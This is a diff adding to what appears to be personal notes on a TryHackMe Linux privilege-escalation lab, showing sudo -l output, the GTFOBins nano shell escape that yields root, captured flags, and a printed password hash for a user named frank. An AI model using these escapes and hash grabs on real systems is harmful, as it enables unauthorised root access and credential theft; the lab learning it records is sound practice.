@@ -495,6 +495,57 @@ root@wade7363:/tmp# find / -name flag1.txt 2>/dev/null
 root@wade7363:/tmp# cat /home/matt/flag1.txt
 THM-28392872729920
 
+### PRIVILEGE ESCALATION: SUDO 
+
+check how many bin you can run with sudo:
+```
+sudo -l
+```
+
+then check here how to escalation the privilege with binary here: `https://gtfobins.github.io/`
+
+example:
+```
+karen@ip-10-10-58-101:/tmp$ sudo -l
+Matching Defaults entries for karen on ip-10-10-58-101:
+  env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User karen may run the following commands on ip-10-10-58-101:
+  (ALL) NOPASSWD: /usr/bin/find
+  (ALL) NOPASSWD: /usr/bin/less
+  (ALL) NOPASSWD: /usr/bin/nano
+karen@ip-10-10-58-101:/tmp$ sudo nano
+```
+
+I've chosen to escalate nano 
+```
+#https://gtfobins.github.io/gtfobins/nano/#sudo
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+sudo nano
+^R^X
+reset; sh 1>&0 2>&0
+
+# I've gained root access
+root@ip-10-10-58-101:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+root@ip-10-10-58-101:/tmp# cat /home/ubuntu/flag2.txt
+THM-402028394
+```
+
+Another consideration to take, is to just read the flag by sudo 
+```
+sudo nano /home/ubuntu/flag2.txt
+```
+
+Now get frank passwd hash
+```
+frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796:0:99999:7:::
+# we only need this
+# $6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1
+
+```
+
 
 
 
